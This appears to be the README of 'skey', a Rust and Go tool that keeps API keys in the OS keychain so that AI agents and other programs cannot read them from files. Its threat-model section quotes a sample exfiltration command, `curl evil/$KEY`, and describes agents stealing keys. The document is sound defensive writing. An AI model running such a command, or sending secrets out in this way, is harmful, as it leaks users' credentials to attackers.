# skey — a treasure box for secret keys 🔒

Helpers like AI agents/bots can read your files. Even free, open-source models
with shell tools can run `printenv` or `cat`. So never leave keys lying around.

```sh
# ❌ Don't do this — any person or tool that can read files can steal these
API_KEY="sk-..."          # in ~/.zshrc / ~/.bashrc (history + ps can leak it)
{ "key": "sk-..." }       # in auth.json (pi) — plain text on disk
MY_KEY=sk-...             # in .env files — EVERY tool can read .env
```

Why is that bad? Imagine your key is candy money. Anyone who opens the drawer
can take it and spend it. That is what a file is: a drawer anyone can open.

`skey` is a piggy bank instead. You drop a key in, it clicks shut. When a
helper needs the key, YOU open it just a crack, just for that one job.

## Why the piggy bank is safer

Keys live in your computer's own safe, not in files:

- macOS Keychain, Linux Secret Service, Windows Credential Manager
- Not a file, so `cat` / `printenv` on a file finds nothing
- Each key has its own lock (per-entry access rules)
- Nothing leaks into shell history, `ps`, or dotfiles

## Two boxes, same piggy bank: Go and Rust

`skey-go/` (Go) and `skey/` (Rust) share one safe and the same commands.
Which is more secure? Honestly: **Rust**. Memory safety, secrets are wiped
from memory (zeroize), no garbage collector leaving key copies around, and
stricter builds. Go is faster to change and experiment with. Pick Rust for
maximum paranoia, Go for hacking. Same service name `skey`, same key list.

## Installation

Install either the Rust or Go version (both use the same commands and share the same OS-native vault):

### Option 1: Rust (Recommended — published on crates.io)
```sh
cargo install skey
```
*Or build from local source:*
```sh
cd skey && cargo install --path .
```

### Option 2: Go
```sh
go install github.com/gwangjinkim/skey/skey-go@latest
```
*Or build from local source:*
```sh
cd skey-go && go install .
```

## The whole trick (4 lines)
Then copy-paste:

```sh
skey set mykey prod                  # 1. drop a key in (typing is hidden)
skey list                            # 2. see labels, never keys
skey get mykey prod                  # 3. peek — ALWAYS asks: Allow access? [y/N]
skey run mykey prod --env MY_KEY -- pi   # 4. lend the key to one command
```

Swap `MY_KEY` for the word your helper reads (`MISTRAL_API_KEY`, `OPENAI_API_KEY`, ...).

## Two rules

1. **`get` always asks.** There is no `--yes`. On purpose. An agent/bot cannot click yes for you (prevents autonomous open-source agent exfiltration).
2. **`run` is mittens mode.** The key goes straight into that one command's pocket, and the answer comes back with the key blacked out (`[REDACTED]`). Agents may add `-y`, but only for jobs YOU trust.

## Honest box: is this secure? 🛡️

No — it is hurdles, not a jail. It stops everyday accidents (sneaky `printenv`,
history leaks, wrong program grabbing a key). But a tool that turns evil AND
has internet can still smuggle the key out (`curl evil/$KEY`, clever re-typing).
For a real wall you need containers, network rules, and allowlists. Full story
in `skey-go/RUN_THREAT_MODEL.md`.

## What next?

Recipes for pi, opencode, claude, codex, omp, deepseek, antigravity, aider,
gemini, and more live here: [`skey-go/README.md`](skey-go/README.md). Start there.
